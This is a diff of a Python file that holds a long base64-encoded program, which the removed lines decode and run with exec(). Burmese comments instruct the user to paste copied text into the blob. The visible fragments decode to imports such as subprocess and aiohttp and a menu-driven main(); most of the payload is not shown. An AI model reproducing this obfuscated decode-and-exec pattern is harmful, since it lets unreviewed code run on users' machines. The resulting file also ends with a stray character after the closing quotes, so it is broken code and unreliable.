@@ -1,7 +1,5 @@
 import base64
 import os
-
-# အောက်ပါ Quotes သုံးခုကြားမှာ ခုနက Copy ကူးလာတဲ့ စာသားတွေကို Paste လုပ်ပါ
 encoded_data = """aW1wb3J0IG9zDQppbXBvcnQgc3lzDQppbXBvcnQganNvbg0KaW1wb3J0IHRpbWUNCmltcG9ydCB1
 dWlkDQppbXBvcnQgaGFzaGxpYg0KaW1wb3J0IGFzeW5jaW8NCmltcG9ydCBhaW9odHRwDQppbXBv
 cnQgc3VicHJvY2Vzcw0KaW1wb3J0IGl0ZXJ0b29scw0KaW1wb3J0IHN0cmluZw0KaW1wb3J0IHJl
@@ -287,8 +285,4 @@ dG8gbWVudS4uLiIpDQoNCmlmIF9fbmFtZV9fID09ICJfX21haW5fXyI6DQogICAgdHJ5Og0KICAg
 ICAgICBtYWluKCkgDQogICAgZXhjZXB0IEtleWJvYXJkSW50ZXJydXB0OiANCiAgICAgICAgcHJp
 bnQoIlxuWyFdIFByb2dyYW0gdGVybWluYXRlZCBieSB1c2VyLiIpIA0KICAgICAgICBzeXMuZXhp
 dCgpIA0KICAgIGV4Y2VwdCBFeGNlcHRpb24gYXMgZTogDQogICAgICAgIHByaW50KGYiWyFdIEFu
-IHVuaGFuZGxlZCBlcnJvciBvY2N1cnJlZDoge2V9IikgDQogICAgICAgIHN5cy5leGl0KDEpDQo="""
-
-# ကုဒ်ကို ပြန်ဖော်ပြီး Run စေခြင်း
-decoded_code = base64.b64decode(encoded_data).decode('utf-8')
-exec(decoded_code)
+IHVuaGFuZGxlZCBlcnJvciBvY2N1cnJlZDoge2V9IikgDQogICAgICAgIHN5cy5leGl0KDEpDQo="""I 
